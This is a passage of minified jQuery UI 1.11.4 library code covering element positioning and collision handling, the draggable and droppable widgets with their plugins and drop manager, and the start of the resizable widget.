i,s=e.within,n=s.isWindow?s.scrollTop:s.offset.top,o=e.within.height,r=t.top-e.collisionPosition.marginTop,l=n-r,h=r+e.collisionHeight-o-n;e.collisionHeight>o?l>0&&0>=h?(i=t.top+l+e.collisionHeight-o-n,t.top+=l-i):t.top=h>0&&0>=l?n:l>h?n+o-e.collisionHeight:n:l>0?t.top+=l:h>0?t.top-=h:t.top=a(t.top-r,t.top)}},flip:{left:function(t,e){var i,s,n=e.within,o=n.offset.left+n.scrollLeft,a=n.width,l=n.isWindow?n.scrollLeft:n.offset.left,h=t.left-e.collisionPosition.marginLeft,c=h-l,u=h+e.collisionWidth-a-l,d="left"===e.my[0]?-e.elemWidth:"right"===e.my[0]?e.elemWidth:0,p="left"===e.at[0]?e.targetWidth:"right"===e.at[0]?-e.targetWidth:0,f=-2*e.offset[0];0>c?(i=t.left+d+p+f+e.collisionWidth-a-o,(0>i||r(c)>i)&&(t.left+=d+p+f)):u>0&&(s=t.left-e.collisionPosition.marginLeft+d+p+f-l,(s>0||u>r(s))&&(t.left+=d+p+f))},top:function(t,e){var i,s,n=e.within,o=n.offset.top+n.scrollTop,a=n.height,l=n.isWindow?n.scrollTop:n.offset.top,h=t.top-e.collisionPosition.marginTop,c=h-l,u=h+e.collisionHeight-a-l,d="top"===e.my[1],p=d?-e.elemHeight:"bottom"===e.my[1]?e.elemHeight:0,f="top"===e.at[1]?e.targetHeight:"bottom"===e.at[1]?-e.targetHeight:0,g=-2*e.offset[1];0>c?(s=t.top+p+f+g+e.collisionHeight-a-o,(0>s||r(c)>s)&&(t.top+=p+f+g)):u>0&&(i=t.top-e.collisionPosition.marginTop+p+f+g-l,(i>0||u>r(i))&&(t.top+=p+f+g))}},flipfit:{left:function(){t.ui.position.flip.left.apply(this,arguments),t.ui.position.fit.left.apply(this,arguments)},top:function(){t.ui.position.flip.top.apply(this,arguments),t.ui.position.fit.top.apply(this,arguments)}}},function(){var e,i,s,n,a,r=document.getElementsByTagName("body")[0],l=document.createElement("div");e=document.createElement(r?"div":"body"),s={visibility:"hidden",width:0,height:0,border:0,margin:0,background:"none"},r&&t.extend(s,{position:"absolute",left:"-1000px",top:"-1000px"});for(a in s)e.style[a]=s[a];e.appendChild(l),i=r||document.documentElement,i.insertBefore(e,i.firstChild),l.style.cssText="position: absolute; left: 10.7432222px;",n=t(l).offset().left,o=n>10&&11>n,e.innerHTML="",i.removeChild(e)}()}(),t.ui.position,t.widget("ui.draggable",t.ui.mouse,{version:"1.11.4",widgetEventPrefix:"drag",options:{addClasses:!0,appendTo:"parent",axis:!1,connectToSortable:!1,containment:!1,cursor:"auto",cursorAt:!1,grid:!1,handle:!1,helper:"original",iframeFix:!1,opacity:!1,refreshPositions:!1,revert:!1,revertDuration:500,scope:"default",scroll:!0,scrollSensitivity:20,scrollSpeed:20,snap:!1,snapMode:"both",snapTolerance:20,stack:!1,zIndex:!1,drag:null,start:null,stop:null},_create:function(){"original"===this.options.helper&&this._setPositionRelative(),this.options.addClasses&&this.element.addClass("ui-draggable"),this.options.disabled&&this.element.addClass("ui-draggable-disabled"),this._setHandleClassName(),this._mouseInit()},_setOption:function(t,e){this._super(t,e),"handle"===t&&(this._removeHandleClassName(),this._setHandleClassName())},_destroy:function(){return(this.helper||this.element).is(".ui-draggable-dragging")?(this.destroyOnClear=!0,void 0):(this.element.removeClass("ui-draggable ui-draggable-dragging ui-draggable-disabled"),this._removeHandleClassName(),this._mouseDestroy(),void 0)},_mouseCapture:function(e){var i=this.options;return this._blurActiveElement(e),this.helper||i.disabled||t(e.target).closest(".ui-resizable-handle").length>0?!1:(this.handle=this._getHandle(e),this.handle?(this._blockFrames(i.iframeFix===!0?"iframe":i.iframeFix),!0):!1)},_blockFrames:function(e){this.iframeBlocks=this.document.find(e).map(function(){var e=t(this);return t("<div>").css("position","absolute").appendTo(e.parent()).outerWidth(e.outerWidth()).outerHeight(e.outerHeight()).offset(e.offset())[0]})},_unblockFrames:function(){this.iframeBlocks&&(this.iframeBlocks.remove(),delete this.iframeBlocks)},_blurActiveElement:function(e){var i=this.document[0];if(this.handleElement.is(e.target))try{i.activeElement&&"body"!==i.activeElement.nodeName.toLowerCase()&&t(i.activeElement).blur()}catch(s){}},_mouseStart:function(e){var i=this.options;return this.helper=this._createHelper(e),this.helper.addClass("ui-draggable-dragging"),this._cacheHelperProportions(),t.ui.ddmanager&&(t.ui.ddmanager.current=this),this._cacheMargins(),this.cssPosition=this.helper.css("position"),this.scrollParent=this.helper.scrollParent(!0),this.offsetParent=this.helper.offsetParent(),this.hasFixedAncestor=this.helper.parents().filter(function(){return"fixed"===t(this).css("position")}).length>0,this.positionAbs=this.element.offset(),this._refreshOffsets(e),this.originalPosition=this.position=this._generatePosition(e,!1),this.originalPageX=e.pageX,this.originalPageY=e.pageY,i.cursorAt&&this._adjustOffsetFromHelper(i.cursorAt),this._setContainment(),this._trigger("start",e)===!1?(this._clear(),!1):(this._cacheHelperProportions(),t.ui.ddmanager&&!i.dropBehaviour&&t.ui.ddmanager.prepareOffsets(this,e),this._normalizeRightBottom(),this._mouseDrag(e,!0),t.ui.ddmanager&&t.ui.ddmanager.dragStart(this,e),!0)},_refreshOffsets:function(t){this.offset={top:this.positionAbs.top-this.margins.top,left:this.positionAbs.left-this.margins.left,scroll:!1,parent:this._getParentOffset(),relative:this._getRelativeOffset()},this.offset.click={left:t.pageX-this.offset.left,top:t.pageY-this.offset.top}},_mouseDrag:function(e,i){if(this.hasFixedAncestor&&(this.offset.parent=this._getParentOffset()),this.position=this._generatePosition(e,!0),this.positionAbs=this._convertPositionTo("absolute"),!i){var s=this._uiHash();if(this._trigger("drag",e,s)===!1)return this._mouseUp({}),!1;this.position=s.position}return this.helper[0].style.left=this.position.left+"px",this.helper[0].style.top=this.position.top+"px",t.ui.ddmanager&&t.ui.ddmanager.drag(this,e),!1},_mouseStop:function(e){var i=this,s=!1;return t.ui.ddmanager&&!this.options.dropBehaviour&&(s=t.ui.ddmanager.drop(this,e)),this.dropped&&(s=this.dropped,this.dropped=!1),"invalid"===this.options.revert&&!s||"valid"===this.options.revert&&s||this.options.revert===!0||t.isFunction(this.options.revert)&&this.options.revert.call(this.element,s)?t(this.helper).animate(this.originalPosition,parseInt(this.options.revertDuration,10),function(){i._trigger("stop",e)!==!1&&i._clear()}):this._trigger("stop",e)!==!1&&this._clear(),!1},_mouseUp:function(e){return this._unblockFrames(),t.ui.ddmanager&&t.ui.ddmanager.dragStop(this,e),this.handleElement.is(e.target)&&this.element.focus(),t.ui.mouse.prototype._mouseUp.call(this,e)},cancel:function(){return this.helper.is(".ui-draggable-dragging")?this._mouseUp({}):this._clear(),this},_getHandle:function(e){return this.options.handle?!!t(e.target).closest(this.element.find(this.options.handle)).length:!0},_setHandleClassName:function(){this.handleElement=this.options.handle?this.element.find(this.options.handle):this.element,this.handleElement.addClass("ui-draggable-handle")},_removeHandleClassName:function(){this.handleElement.removeClass("ui-draggable-handle")},_createHelper:function(e){var i=this.options,s=t.isFunction(i.helper),n=s?t(i.helper.apply(this.element[0],[e])):"clone"===i.helper?this.element.clone().removeAttr("id"):this.element;return n.parents("body").length||n.appendTo("parent"===i.appendTo?this.element[0].parentNode:i.appendTo),s&&n[0]===this.element[0]&&this._setPositionRelative(),n[0]===this.element[0]||/(fixed|absolute)/.test(n.css("position"))||n.css("position","absolute"),n},_setPositionRelative:function(){/^(?:r|a|f)/.test(this.element.css("position"))||(this.element[0].style.position="relative")},_adjustOffsetFromHelper:function(e){"string"==typeof e&&(e=e.split(" ")),t.isArray(e)&&(e={left:+e[0],top:+e[1]||0}),"left"in e&&(this.offset.click.left=e.left+this.margins.left),"right"in e&&(this.offset.click.left=this.helperProportions.width-e.right+this.margins.left),"top"in e&&(this.offset.click.top=e.top+this.margins.top),"bottom"in e&&(this.offset.click.top=this.helperProportions.height-e.bottom+this.margins.top)},_isRootNode:function(t){return/(html|body)/i.test(t.tagName)||t===this.document[0]},_getParentOffset:function(){var e=this.offsetParent.offset(),i=this.document[0];return"absolute"===this.cssPosition&&this.scrollParent[0]!==i&&t.contains(this.scrollParent[0],this.offsetParent[0])&&(e.left+=this.scrollParent.scrollLeft(),e.top+=this.scrollParent.scrollTop()),this._isRootNode(this.offsetParent[0])&&(e={top:0,left:0}),{top:e.top+(parseInt(this.offsetParent.css("borderTopWidth"),10)||0),left:e.left+(parseInt(this.offsetParent.css("borderLeftWidth"),10)||0)}},_getRelativeOffset:function(){if("relative"!==this.cssPosition)return{top:0,left:0};var t=this.element.position(),e=this._isRootNode(this.scrollParent[0]);return{top:t.top-(parseInt(this.helper.css("top"),10)||0)+(e?0:this.scrollParent.scrollTop()),left:t.left-(parseInt(this.helper.css("left"),10)||0)+(e?0:this.scrollParent.scrollLeft())}},_cacheMargins:function(){this.margins={left:parseInt(this.element.css("marginLeft"),10)||0,top:parseInt(this.element.css("marginTop"),10)||0,right:parseInt(this.element.css("marginRight"),10)||0,bottom:parseInt(this.element.css("marginBottom"),10)||0}},_cacheHelperProportions:function(){this.helperProportions={width:this.helper.outerWidth(),height:this.helper.outerHeight()}},_setContainment:function(){var e,i,s,n=this.options,o=this.document[0];return this.relativeContainer=null,n.containment?"window"===n.containment?(this.containment=[t(window).scrollLeft()-this.offset.relative.left-this.offset.parent.left,t(window).scrollTop()-this.offset.relative.top-this.offset.parent.top,t(window).scrollLeft()+t(window).width()-this.helperProportions.width-this.margins.left,t(window).scrollTop()+(t(window).height()||o.body.parentNode.scrollHeight)-this.helperProportions.height-this.margins.top],void 0):"document"===n.containment?(this.containment=[0,0,t(o).width()-this.helperProportions.width-this.margins.left,(t(o).height()||o.body.parentNode.scrollHeight)-this.helperProportions.height-this.margins.top],void 0):n.containment.constructor===Array?(this.containment=n.containment,void 0):("parent"===n.containment&&(n.containment=this.helper[0].parentNode),i=t(n.containment),s=i[0],s&&(e=/(scroll|auto)/.test(i.css("overflow")),this.containment=[(parseInt(i.css("borderLeftWidth"),10)||0)+(parseInt(i.css("paddingLeft"),10)||0),(parseInt(i.css("borderTopWidth"),10)||0)+(parseInt(i.css("paddingTop"),10)||0),(e?Math.max(s.scrollWidth,s.offsetWidth):s.offsetWidth)-(parseInt(i.css("borderRightWidth"),10)||0)-(parseInt(i.css("paddingRight"),10)||0)-this.helperProportions.width-this.margins.left-this.margins.right,(e?Math.max(s.scrollHeight,s.offsetHeight):s.offsetHeight)-(parseInt(i.css("borderBottomWidth"),10)||0)-(parseInt(i.css("paddingBottom"),10)||0)-this.helperProportions.height-this.margins.top-this.margins.bottom],this.relativeContainer=i),void 0):(this.containment=null,void 0)},_convertPositionTo:function(t,e){e||(e=this.position);var i="absolute"===t?1:-1,s=this._isRootNode(this.scrollParent[0]);return{top:e.top+this.offset.relative.top*i+this.offset.parent.top*i-("fixed"===this.cssPosition?-this.offset.scroll.top:s?0:this.offset.scroll.top)*i,left:e.left+this.offset.relative.left*i+this.offset.parent.left*i-("fixed"===this.cssPosition?-this.offset.scroll.left:s?0:this.offset.scroll.left)*i}},_generatePosition:function(t,e){var i,s,n,o,a=this.options,r=this._isRootNode(this.scrollParent[0]),l=t.pageX,h=t.pageY;return r&&this.offset.scroll||(this.offset.scroll={top:this.scrollParent.scrollTop(),left:this.scrollParent.scrollLeft()}),e&&(this.containment&&(this.relativeContainer?(s=this.relativeContainer.offset(),i=[this.containment[0]+s.left,this.containment[1]+s.top,this.containment[2]+s.left,this.containment[3]+s.top]):i=this.containment,t.pageX-this.offset.click.left<i[0]&&(l=i[0]+this.offset.click.left),t.pageY-this.offset.click.top<i[1]&&(h=i[1]+this.offset.click.top),t.pageX-this.offset.click.left>i[2]&&(l=i[2]+this.offset.click.left),t.pageY-this.offset.click.top>i[3]&&(h=i[3]+this.offset.click.top)),a.grid&&(n=a.grid[1]?this.originalPageY+Math.round((h-this.originalPageY)/a.grid[1])*a.grid[1]:this.originalPageY,h=i?n-this.offset.click.top>=i[1]||n-this.offset.click.top>i[3]?n:n-this.offset.click.top>=i[1]?n-a.grid[1]:n+a.grid[1]:n,o=a.grid[0]?this.originalPageX+Math.round((l-this.originalPageX)/a.grid[0])*a.grid[0]:this.originalPageX,l=i?o-this.offset.click.left>=i[0]||o-this.offset.click.left>i[2]?o:o-this.offset.click.left>=i[0]?o-a.grid[0]:o+a.grid[0]:o),"y"===a.axis&&(l=this.originalPageX),"x"===a.axis&&(h=this.originalPageY)),{top:h-this.offset.click.top-this.offset.relative.top-this.offset.parent.top+("fixed"===this.cssPosition?-this.offset.scroll.top:r?0:this.offset.scroll.top),left:l-this.offset.click.left-this.offset.relative.left-this.offset.parent.left+("fixed"===this.cssPosition?-this.offset.scroll.left:r?0:this.offset.scroll.left)}},_clear:function(){this.helper.removeClass("ui-draggable-dragging"),this.helper[0]===this.element[0]||this.cancelHelperRemoval||this.helper.remove(),this.helper=null,this.cancelHelperRemoval=!1,this.destroyOnClear&&this.destroy()},_normalizeRightBottom:function(){"y"!==this.options.axis&&"auto"!==this.helper.css("right")&&(this.helper.width(this.helper.width()),this.helper.css("right","auto")),"x"!==this.options.axis&&"auto"!==this.helper.css("bottom")&&(this.helper.height(this.helper.height()),this.helper.css("bottom","auto"))},_trigger:function(e,i,s){return s=s||this._uiHash(),t.ui.plugin.call(this,e,[i,s,this],!0),/^(drag|start|stop)/.test(e)&&(this.positionAbs=this._convertPositionTo("absolute"),s.offset=this.positionAbs),t.Widget.prototype._trigger.call(this,e,i,s)},plugins:{},_uiHash:function(){return{helper:this.helper,position:this.position,originalPosition:this.originalPosition,offset:this.positionAbs}}}),t.ui.plugin.add("draggable","connectToSortable",{start:function(e,i,s){var n=t.extend({},i,{item:s.element});s.sortables=[],t(s.options.connectToSortable).each(function(){var i=t(this).sortable("instance");i&&!i.options.disabled&&(s.sortables.push(i),i.refreshPositions(),i._trigger("activate",e,n))})},stop:function(e,i,s){var n=t.extend({},i,{item:s.element});s.cancelHelperRemoval=!1,t.each(s.sortables,function(){var t=this;t.isOver?(t.isOver=0,s.cancelHelperRemoval=!0,t.cancelHelperRemoval=!1,t._storedCSS={position:t.placeholder.css("position"),top:t.placeholder.css("top"),left:t.placeholder.css("left")},t._mouseStop(e),t.options.helper=t.options._helper):(t.cancelHelperRemoval=!0,t._trigger("deactivate",e,n))})},drag:function(e,i,s){t.each(s.sortables,function(){var n=!1,o=this;o.positionAbs=s.positionAbs,o.helperProportions=s.helperProportions,o.offset.click=s.offset.click,o._intersectsWith(o.containerCache)&&(n=!0,t.each(s.sortables,function(){return this.positionAbs=s.positionAbs,this.helperProportions=s.helperProportions,this.offset.click=s.offset.click,this!==o&&this._intersectsWith(this.containerCache)&&t.contains(o.element[0],this.element[0])&&(n=!1),n
})),n?(o.isOver||(o.isOver=1,s._parent=i.helper.parent(),o.currentItem=i.helper.appendTo(o.element).data("ui-sortable-item",!0),o.options._helper=o.options.helper,o.options.helper=function(){return i.helper[0]},e.target=o.currentItem[0],o._mouseCapture(e,!0),o._mouseStart(e,!0,!0),o.offset.click.top=s.offset.click.top,o.offset.click.left=s.offset.click.left,o.offset.parent.left-=s.offset.parent.left-o.offset.parent.left,o.offset.parent.top-=s.offset.parent.top-o.offset.parent.top,s._trigger("toSortable",e),s.dropped=o.element,t.each(s.sortables,function(){this.refreshPositions()}),s.currentItem=s.element,o.fromOutside=s),o.currentItem&&(o._mouseDrag(e),i.position=o.position)):o.isOver&&(o.isOver=0,o.cancelHelperRemoval=!0,o.options._revert=o.options.revert,o.options.revert=!1,o._trigger("out",e,o._uiHash(o)),o._mouseStop(e,!0),o.options.revert=o.options._revert,o.options.helper=o.options._helper,o.placeholder&&o.placeholder.remove(),i.helper.appendTo(s._parent),s._refreshOffsets(e),i.position=s._generatePosition(e,!0),s._trigger("fromSortable",e),s.dropped=!1,t.each(s.sortables,function(){this.refreshPositions()}))})}}),t.ui.plugin.add("draggable","cursor",{start:function(e,i,s){var n=t("body"),o=s.options;n.css("cursor")&&(o._cursor=n.css("cursor")),n.css("cursor",o.cursor)},stop:function(e,i,s){var n=s.options;n._cursor&&t("body").css("cursor",n._cursor)}}),t.ui.plugin.add("draggable","opacity",{start:function(e,i,s){var n=t(i.helper),o=s.options;n.css("opacity")&&(o._opacity=n.css("opacity")),n.css("opacity",o.opacity)},stop:function(e,i,s){var n=s.options;n._opacity&&t(i.helper).css("opacity",n._opacity)}}),t.ui.plugin.add("draggable","scroll",{start:function(t,e,i){i.scrollParentNotHidden||(i.scrollParentNotHidden=i.helper.scrollParent(!1)),i.scrollParentNotHidden[0]!==i.document[0]&&"HTML"!==i.scrollParentNotHidden[0].tagName&&(i.overflowOffset=i.scrollParentNotHidden.offset())},drag:function(e,i,s){var n=s.options,o=!1,a=s.scrollParentNotHidden[0],r=s.document[0];a!==r&&"HTML"!==a.tagName?(n.axis&&"x"===n.axis||(s.overflowOffset.top+a.offsetHeight-e.pageY<n.scrollSensitivity?a.scrollTop=o=a.scrollTop+n.scrollSpeed:e.pageY-s.overflowOffset.top<n.scrollSensitivity&&(a.scrollTop=o=a.scrollTop-n.scrollSpeed)),n.axis&&"y"===n.axis||(s.overflowOffset.left+a.offsetWidth-e.pageX<n.scrollSensitivity?a.scrollLeft=o=a.scrollLeft+n.scrollSpeed:e.pageX-s.overflowOffset.left<n.scrollSensitivity&&(a.scrollLeft=o=a.scrollLeft-n.scrollSpeed))):(n.axis&&"x"===n.axis||(e.pageY-t(r).scrollTop()<n.scrollSensitivity?o=t(r).scrollTop(t(r).scrollTop()-n.scrollSpeed):t(window).height()-(e.pageY-t(r).scrollTop())<n.scrollSensitivity&&(o=t(r).scrollTop(t(r).scrollTop()+n.scrollSpeed))),n.axis&&"y"===n.axis||(e.pageX-t(r).scrollLeft()<n.scrollSensitivity?o=t(r).scrollLeft(t(r).scrollLeft()-n.scrollSpeed):t(window).width()-(e.pageX-t(r).scrollLeft())<n.scrollSensitivity&&(o=t(r).scrollLeft(t(r).scrollLeft()+n.scrollSpeed)))),o!==!1&&t.ui.ddmanager&&!n.dropBehaviour&&t.ui.ddmanager.prepareOffsets(s,e)}}),t.ui.plugin.add("draggable","snap",{start:function(e,i,s){var n=s.options;s.snapElements=[],t(n.snap.constructor!==String?n.snap.items||":data(ui-draggable)":n.snap).each(function(){var e=t(this),i=e.offset();this!==s.element[0]&&s.snapElements.push({item:this,width:e.outerWidth(),height:e.outerHeight(),top:i.top,left:i.left})})},drag:function(e,i,s){var n,o,a,r,l,h,c,u,d,p,f=s.options,g=f.snapTolerance,m=i.offset.left,_=m+s.helperProportions.width,v=i.offset.top,b=v+s.helperProportions.height;for(d=s.snapElements.length-1;d>=0;d--)l=s.snapElements[d].left-s.margins.left,h=l+s.snapElements[d].width,c=s.snapElements[d].top-s.margins.top,u=c+s.snapElements[d].height,l-g>_||m>h+g||c-g>b||v>u+g||!t.contains(s.snapElements[d].item.ownerDocument,s.snapElements[d].item)?(s.snapElements[d].snapping&&s.options.snap.release&&s.options.snap.release.call(s.element,e,t.extend(s._uiHash(),{snapItem:s.snapElements[d].item})),s.snapElements[d].snapping=!1):("inner"!==f.snapMode&&(n=g>=Math.abs(c-b),o=g>=Math.abs(u-v),a=g>=Math.abs(l-_),r=g>=Math.abs(h-m),n&&(i.position.top=s._convertPositionTo("relative",{top:c-s.helperProportions.height,left:0}).top),o&&(i.position.top=s._convertPositionTo("relative",{top:u,left:0}).top),a&&(i.position.left=s._convertPositionTo("relative",{top:0,left:l-s.helperProportions.width}).left),r&&(i.position.left=s._convertPositionTo("relative",{top:0,left:h}).left)),p=n||o||a||r,"outer"!==f.snapMode&&(n=g>=Math.abs(c-v),o=g>=Math.abs(u-b),a=g>=Math.abs(l-m),r=g>=Math.abs(h-_),n&&(i.position.top=s._convertPositionTo("relative",{top:c,left:0}).top),o&&(i.position.top=s._convertPositionTo("relative",{top:u-s.helperProportions.height,left:0}).top),a&&(i.position.left=s._convertPositionTo("relative",{top:0,left:l}).left),r&&(i.position.left=s._convertPositionTo("relative",{top:0,left:h-s.helperProportions.width}).left)),!s.snapElements[d].snapping&&(n||o||a||r||p)&&s.options.snap.snap&&s.options.snap.snap.call(s.element,e,t.extend(s._uiHash(),{snapItem:s.snapElements[d].item})),s.snapElements[d].snapping=n||o||a||r||p)}}),t.ui.plugin.add("draggable","stack",{start:function(e,i,s){var n,o=s.options,a=t.makeArray(t(o.stack)).sort(function(e,i){return(parseInt(t(e).css("zIndex"),10)||0)-(parseInt(t(i).css("zIndex"),10)||0)});a.length&&(n=parseInt(t(a[0]).css("zIndex"),10)||0,t(a).each(function(e){t(this).css("zIndex",n+e)}),this.css("zIndex",n+a.length))}}),t.ui.plugin.add("draggable","zIndex",{start:function(e,i,s){var n=t(i.helper),o=s.options;n.css("zIndex")&&(o._zIndex=n.css("zIndex")),n.css("zIndex",o.zIndex)},stop:function(e,i,s){var n=s.options;n._zIndex&&t(i.helper).css("zIndex",n._zIndex)}}),t.ui.draggable,t.widget("ui.droppable",{version:"1.11.4",widgetEventPrefix:"drop",options:{accept:"*",activeClass:!1,addClasses:!0,greedy:!1,hoverClass:!1,scope:"default",tolerance:"intersect",activate:null,deactivate:null,drop:null,out:null,over:null},_create:function(){var e,i=this.options,s=i.accept;this.isover=!1,this.isout=!0,this.accept=t.isFunction(s)?s:function(t){return t.is(s)},this.proportions=function(){return arguments.length?(e=arguments[0],void 0):e?e:e={width:this.element[0].offsetWidth,height:this.element[0].offsetHeight}},this._addToManager(i.scope),i.addClasses&&this.element.addClass("ui-droppable")},_addToManager:function(e){t.ui.ddmanager.droppables[e]=t.ui.ddmanager.droppables[e]||[],t.ui.ddmanager.droppables[e].push(this)},_splice:function(t){for(var e=0;t.length>e;e++)t[e]===this&&t.splice(e,1)},_destroy:function(){var e=t.ui.ddmanager.droppables[this.options.scope];this._splice(e),this.element.removeClass("ui-droppable ui-droppable-disabled")},_setOption:function(e,i){if("accept"===e)this.accept=t.isFunction(i)?i:function(t){return t.is(i)};else if("scope"===e){var s=t.ui.ddmanager.droppables[this.options.scope];this._splice(s),this._addToManager(i)}this._super(e,i)},_activate:function(e){var i=t.ui.ddmanager.current;this.options.activeClass&&this.element.addClass(this.options.activeClass),i&&this._trigger("activate",e,this.ui(i))},_deactivate:function(e){var i=t.ui.ddmanager.current;this.options.activeClass&&this.element.removeClass(this.options.activeClass),i&&this._trigger("deactivate",e,this.ui(i))},_over:function(e){var i=t.ui.ddmanager.current;i&&(i.currentItem||i.element)[0]!==this.element[0]&&this.accept.call(this.element[0],i.currentItem||i.element)&&(this.options.hoverClass&&this.element.addClass(this.options.hoverClass),this._trigger("over",e,this.ui(i)))},_out:function(e){var i=t.ui.ddmanager.current;i&&(i.currentItem||i.element)[0]!==this.element[0]&&this.accept.call(this.element[0],i.currentItem||i.element)&&(this.options.hoverClass&&this.element.removeClass(this.options.hoverClass),this._trigger("out",e,this.ui(i)))},_drop:function(e,i){var s=i||t.ui.ddmanager.current,n=!1;return s&&(s.currentItem||s.element)[0]!==this.element[0]?(this.element.find(":data(ui-droppable)").not(".ui-draggable-dragging").each(function(){var i=t(this).droppable("instance");return i.options.greedy&&!i.options.disabled&&i.options.scope===s.options.scope&&i.accept.call(i.element[0],s.currentItem||s.element)&&t.ui.intersect(s,t.extend(i,{offset:i.element.offset()}),i.options.tolerance,e)?(n=!0,!1):void 0}),n?!1:this.accept.call(this.element[0],s.currentItem||s.element)?(this.options.activeClass&&this.element.removeClass(this.options.activeClass),this.options.hoverClass&&this.element.removeClass(this.options.hoverClass),this._trigger("drop",e,this.ui(s)),this.element):!1):!1},ui:function(t){return{draggable:t.currentItem||t.element,helper:t.helper,position:t.position,offset:t.positionAbs}}}),t.ui.intersect=function(){function t(t,e,i){return t>=e&&e+i>t}return function(e,i,s,n){if(!i.offset)return!1;var o=(e.positionAbs||e.position.absolute).left+e.margins.left,a=(e.positionAbs||e.position.absolute).top+e.margins.top,r=o+e.helperProportions.width,l=a+e.helperProportions.height,h=i.offset.left,c=i.offset.top,u=h+i.proportions().width,d=c+i.proportions().height;switch(s){case"fit":return o>=h&&u>=r&&a>=c&&d>=l;case"intersect":return o+e.helperProportions.width/2>h&&u>r-e.helperProportions.width/2&&a+e.helperProportions.height/2>c&&d>l-e.helperProportions.height/2;case"pointer":return t(n.pageY,c,i.proportions().height)&&t(n.pageX,h,i.proportions().width);case"touch":return(a>=c&&d>=a||l>=c&&d>=l||c>a&&l>d)&&(o>=h&&u>=o||r>=h&&u>=r||h>o&&r>u);default:return!1}}}(),t.ui.ddmanager={current:null,droppables:{"default":[]},prepareOffsets:function(e,i){var s,n,o=t.ui.ddmanager.droppables[e.options.scope]||[],a=i?i.type:null,r=(e.currentItem||e.element).find(":data(ui-droppable)").addBack();t:for(s=0;o.length>s;s++)if(!(o[s].options.disabled||e&&!o[s].accept.call(o[s].element[0],e.currentItem||e.element))){for(n=0;r.length>n;n++)if(r[n]===o[s].element[0]){o[s].proportions().height=0;continue t}o[s].visible="none"!==o[s].element.css("display"),o[s].visible&&("mousedown"===a&&o[s]._activate.call(o[s],i),o[s].offset=o[s].element.offset(),o[s].proportions({width:o[s].element[0].offsetWidth,height:o[s].element[0].offsetHeight}))}},drop:function(e,i){var s=!1;return t.each((t.ui.ddmanager.droppables[e.options.scope]||[]).slice(),function(){this.options&&(!this.options.disabled&&this.visible&&t.ui.intersect(e,this,this.options.tolerance,i)&&(s=this._drop.call(this,i)||s),!this.options.disabled&&this.visible&&this.accept.call(this.element[0],e.currentItem||e.element)&&(this.isout=!0,this.isover=!1,this._deactivate.call(this,i)))}),s},dragStart:function(e,i){e.element.parentsUntil("body").bind("scroll.droppable",function(){e.options.refreshPositions||t.ui.ddmanager.prepareOffsets(e,i)})},drag:function(e,i){e.options.refreshPositions&&t.ui.ddmanager.prepareOffsets(e,i),t.each(t.ui.ddmanager.droppables[e.options.scope]||[],function(){if(!this.options.disabled&&!this.greedyChild&&this.visible){var s,n,o,a=t.ui.intersect(e,this,this.options.tolerance,i),r=!a&&this.isover?"isout":a&&!this.isover?"isover":null;r&&(this.options.greedy&&(n=this.options.scope,o=this.element.parents(":data(ui-droppable)").filter(function(){return t(this).droppable("instance").options.scope===n}),o.length&&(s=t(o[0]).droppable("instance"),s.greedyChild="isover"===r)),s&&"isover"===r&&(s.isover=!1,s.isout=!0,s._out.call(s,i)),this[r]=!0,this["isout"===r?"isover":"isout"]=!1,this["isover"===r?"_over":"_out"].call(this,i),s&&"isout"===r&&(s.isout=!1,s.isover=!0,s._over.call(s,i)))}})},dragStop:function(e,i){e.element.parentsUntil("body").unbind("scroll.droppable"),e.options.refreshPositions||t.ui.ddmanager.prepareOffsets(e,i)}},t.ui.droppable,t.widget("ui.resizable",t.ui.mouse,{version:"1.11.4",widgetEventPrefix:"resize",options:{alsoResize:!1,animate:!1,animateDuration:"slow",animateEasing:"swing",aspectRatio:!1,autoHide:!1,containment:!1,ghost:!1,grid:!1,handles:"e,s,se",helper:!1,maxHeight:null,maxWidth:null,minHeight:10,minWidth:10,zIndex:90,resize:null,start:null,stop:null},_num:function(t){return parseInt(t,10)||0},_isNumber:function(t){return!isNaN(parseInt(t,10))},_hasScroll:function(e,i){if("hidden"===t(e).css("overflow"))return!1;var s=i&&"left"===i?"scrollLeft":"scrollTop",n=!1;return e[s]>0?!0:(e[s]=1,n=e[s]>0,e[s]=0,n)},_create:function(){var e,i,s,n,o,a=this,r=this.options;if(this.element.addClass("ui-resizable"),t.extend(this,{_aspectRatio:!!r.aspectRatio,aspectRatio:r.aspectRatio,originalElement:this.element,_proportionallyResizeElements:[],_helper:r.helper||r.ghost||r.animate?r.helper||"ui-resizable-helper":null}),this.element[0].nodeName.match(/^(canvas|textarea|input|select|button|img)$/i)&&(this.element.wrap(t("<div class='ui-wrapper' style='overflow: hidden;'></div>").css({position:this.element.css("position"),width:this.element.outerWidth(),height:this.element.outerHeight(),top:this.element.css("top"),left:this.element.css("left")})),this.element=this.element.parent().data("ui-resizable",this.element.resizable("instance")),this.elementIsWrapper=!0,this.element.css({marginLeft:this.originalElement.css("marginLeft"),marginTop:this.originalElement.css("marginTop"),marginRight:this.originalElement.css("marginRight"),marginBottom:this.originalElement.css("marginBottom")}),this.originalElement.css({marginLeft:0,marginTop:0,marginRight:0,marginBottom:0}),this.originalResizeStyle=this.originalElement.css("resize"),this.originalElement.css("resize","none"),this._proportionallyResizeElements.push(this.originalElement.css({position:"static",zoom:1,display:"block"})),this.originalElement.css({margin:this.originalElement.css("margin")}),this._proportionallyResize()),this.handles=r.handles||(t(".ui-resizable-handle",this.element).length?{n:".ui-resizable-n",e:".ui-resizable-e",s:".ui-resizable-s",w:".ui-resizable-w",se:".ui-resizable-se",sw:".ui-resizable-sw",ne:".ui-resizable-ne",nw:".ui-resizable-nw"}:"e,s,se"),this._handles=t(),this.handles.constructor===String)for("all"===this.handles&&(this.handles="n,e,s,w,se,sw,ne,nw"),e=this.handles.split(","),this.handles={},i=0;e.length>i;i++)s=t.trim(e[i]),o="ui-resizable-"+s,n=t("<div class='ui-resizable-handle "+o+"'></div>"),n.css({zIndex:r.zIndex}),"se"===s&&n.addClass("ui-icon ui-icon-gripsmall-diagonal-se"),this.handles[s]=".ui-resizable-"+s,this.element.append(n);this._renderAxis=function(e){var i,s,n,o;e=e||this.element;for(i in 